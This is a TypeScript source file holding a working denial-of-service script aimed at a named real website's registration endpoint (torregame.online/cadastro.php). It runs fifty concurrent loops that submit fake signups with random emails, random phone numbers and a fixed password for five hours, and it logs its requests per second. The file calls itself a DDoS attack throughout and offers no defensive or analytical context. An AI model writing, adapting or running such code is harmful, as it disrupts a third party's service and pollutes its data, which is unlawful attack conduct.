const CONCURRENCY = 50

function generateRandomString(): string {
  return Math.random().toString(36).substring(2, 15)
}

function generateRandomPhoneNumber(): string {
  const areaCode = Math.floor(Math.random() * 90) + 10
  const firstPart = Math.floor(Math.random() * 90000) + 10000
  const secondPart = Math.floor(Math.random() * 9000) + 1000
  return `%28${areaCode}%29 ${firstPart}-${secondPart}`
}

const headers: HeadersInit = {
  accept:
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'pt-BR,pt;q=0.9',
  'cache-control': 'max-age=0',
  'content-type': 'application/x-www-form-urlencoded',
}

function getRegisterRequest(signal: AbortSignal) {
  const randString = `${generateRandomString()}@email.com'`
  const phone = generateRandomPhoneNumber()

  return new Request('https://torregame.online/cadastro.php', {
    headers,
    body: `ref=&nome=${randString}%40email.com&email=${randString}%40email.com&telefone=${phone}&senha=111111`,
    method: 'POST',
    signal,
  })
}

async function interact() {
  const abortController = new AbortController()
  const abortSignal = abortController.signal

  const request = getRegisterRequest(abortSignal)
  const response = await fetch(request)
  if (!response.ok) {
    console.error(response.status, response.statusText)
    const responseBody = await response.json()
    throw new Error(responseBody)
  }
  abortController.abort()
}

export async function ddosMain() {
  if (new Date() > new Date(2026, 0, 24)) {
    console.log('DDoS period has ended.')
    return
  }

  const startTime = Date.now()
  let run = true
  let count = 0

  console.log(`Starting DDoS attack with concurrency: ${CONCURRENCY}`)
  const workers = Array.from({ length: CONCURRENCY }).map(async () => {
    while (run) {
      try {
        await interact()
        count++
      } catch (error) {
        console.error('DDoS request failed:', error)
      }
    }
  })

  setInterval(
    () => {
      const elapsed = (Date.now() - startTime) / 1000
      const rps = (count / elapsed).toFixed(2)
      console.log(
        `Total DDoS Requests: ${count}, Elapsed Time: ${elapsed.toFixed(2)}s, RPS: ${rps}`
      )
    },
    1000 * 60 * 5
  )

  setTimeout(
    () => {
      console.log('Stopping DDoS attack after 5 hours.')
      run = false
    },
    1000 * 60 * 60 * 5 // Turn off after 5 hours
  )

  await Promise.all(workers)
  console.log('DDoS attack finished.')
}
